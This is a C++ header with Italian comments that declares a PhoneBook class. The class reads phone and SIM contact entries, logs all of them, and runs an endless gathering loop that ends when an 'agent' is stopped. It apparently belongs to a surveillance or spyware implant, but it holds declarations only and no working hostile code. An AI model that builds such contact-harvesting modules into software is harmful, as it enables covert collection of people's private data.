#include "Common.h"
#include <string>
#include <exception>
using namespace std;

#ifndef __PhoneBook_h__
#define __PhoneBook_h__

#include "Log.h"
#include "Status.h"

class Log;
class Status;
class PhoneBook;

class PhoneBook
{
	/**
	 * Utilizzato per scrivere i log.
	 */
	private: Log* logObj;
	private: Status statusObj;

	/**
	 * Legge una entry dalla rubrica (del telefono) identificata dall'Id e riempie la EntryStruct. Torna TRUE se la ricerca e' 
	 * andata a buon fine, FALSE altrimenti.
	 */
	private: list<PhoneBookStruct*>* GetRecordByIndexFromPhone(UINT id);

	/**
	 * Legge una entry dalla rubrica (della SIM) identificata dall'Id e riempie la EntryStruct. Torna TRUE se la ricerca e' 
	 * andata a buon fine, FALSE altrimenti.
	 */
	private: list<PhoneBookStruct*>* GetRecordByIndexFromSim(UINT id);

	/**
	 * Torna il numero di entry presenti nella rubrica.
	 */
	private: UINT GetRecordNumber(UINT type);

	/**
	 * Raccoglie nel file di log tutte le entry presenti in rubrica. Torna TRUE se la chiamata e' andata a buon fine,
	 * FALSE altrimentil.
	 */
	private: BOOL GetAll();

	/**
	 * Costruttore dell'oggetto, prende un intero per definire il tipo di dati da acquisire.
	 */
	public:  PhoneBook(UINT type);

	/**
	 * Loop infinito che effettua il gathering dei dati, esce con una ExitThread() quando viene richiesto lo stop
	 * dell'agente.
	 */
	public: void Run();
};

#endif
